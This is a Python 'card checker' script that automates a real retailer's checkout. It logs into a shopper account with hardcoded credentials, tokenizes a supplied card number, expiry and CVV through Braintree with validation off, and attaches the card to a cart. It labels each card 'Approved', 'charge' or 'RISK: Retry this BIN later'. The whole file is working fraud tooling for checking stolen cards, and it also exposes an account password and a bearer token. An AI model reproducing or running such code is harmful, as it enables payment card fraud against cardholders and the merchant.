def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start): end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )


def chk(card):
    import requests, re, base64, random, string, user_agent, time, cloudscraper
    from requests_toolbelt.multipart.encoder import MultipartEncoder
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    card = card.strip()
    parts = re.split('[|/:]', card)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]

    if "20" in yy:
        yy = yy.split("20")[1]

    scraper = cloudscraper.create_scraper()

    user = user_agent.generate_user_agent()
    ses = requests.session()
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'authorization': 'Bearer 77e00cc631c23c65bf4da0107d3239',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.boxup.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.boxup.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
    }
    json_data = {
        'operationName': 'MyQuery',
        'variables': {},
        'query': 'query MyQuery {\n  storefrontConfig {\n    tenantId\n    storefrontId\n    accountId\n    companyId\n    __typename\n  }\n  schemaVersion {\n    version\n    __typename\n  }\n}',
    }

    response = ses.post('https://graphql.datocms.com/',
                       headers=headers, json=json_data)
    storeFrontId = (response.json()["data"]["storefrontConfig"]["storefrontId"])
    time.sleep(1)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.boxup.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.boxup.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
    }
    json_data = {
        'storeFrontId': storeFrontId,
        'email': 'lyy446333@gmail.com',
        'password': 'jojo@ALi123',
        'culture': 'en',
        'siteUrl': 'https://www.boxup.com',
    }
    response = ses.post('https://d399c0k9cx39rz.cloudfront.net/v1/boxup-shoppers/login',
                        headers=headers, json=json_data)
    accessToken = (response.json()["accessToken"])
    time.sleep(1)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'authorization': f'Bearer {accessToken}',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.boxup.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.boxup.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
    }
    json_data = {
        'email': 'lyy446333@gmail.com',
        'tenant': 'boxup-production',
        'firstname': 'safsda',
        'lastname': 'gasdhsd',
    }

    response = ses.post('https://core.storefront.cimpress.io/boxup-newsletter/v0/subscribe',
                       headers=headers, json=json_data)
    time.sleep(1)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'authorization': f'Bearer {accessToken}',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.boxup.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.boxup.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
    }
    json_data = {
        'paymentMethod': 'BRAINTREE',
        'request': {
            'customerId': 'bc9e86ea-7817-44cb-8a17-3c812148b50d',
        },
    }
    response = ses.post(
        f'https://api.storefront.cimpress.io/payment/v0/tenants/boxup-production/storefronts/{storeFrontId}/paymentMethods/metadata',
        headers=headers,
        json=json_data,
    )
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', base64.b64decode(
        response.json()["metadata"]["token"]).decode('utf-8'))[0]

    time.sleep(1)

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
    }
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    response = ses.post('https://payments.braintree-api.com/graphql',
                        headers=headers, json=json_data)
    token = (response.json()["data"]["tokenizeCreditCard"]["token"])
    time.sleep(1)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'authorization': f'Bearer {accessToken}',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.boxup.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.boxup.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
    }
    json_data = {
        'action': 'create',
        'request': {
            'paymentMethod': 'BRAINTREE',
            'paymentMethodNonce': token,
        },
    }
    response = ses.post(
        f'https://api.storefront.cimpress.io/payment/v0/tenants/boxup-production/storefronts/{storeFrontId}/carts/7c53d0bd-d477-4116-aafa-b637fe750aa6/payments',
        headers=headers,
        json=json_data,
    )
    text = response.text
    pattern = r'"message":"[^:]+:([^:]+):'

    if 'risk_threshold' in text:
        result = "RISK: Retry this BIN later."
    elif '[{"code"' in text:
        result = "charge"
    elif 'code' in text or 'Payment method successfully added.' in text:
        result = "1000: Approved"
    else:
        match = re.search(pattern, text)
        if match:
            result = match.group(1)
        else:
            result = "Error"

    return result

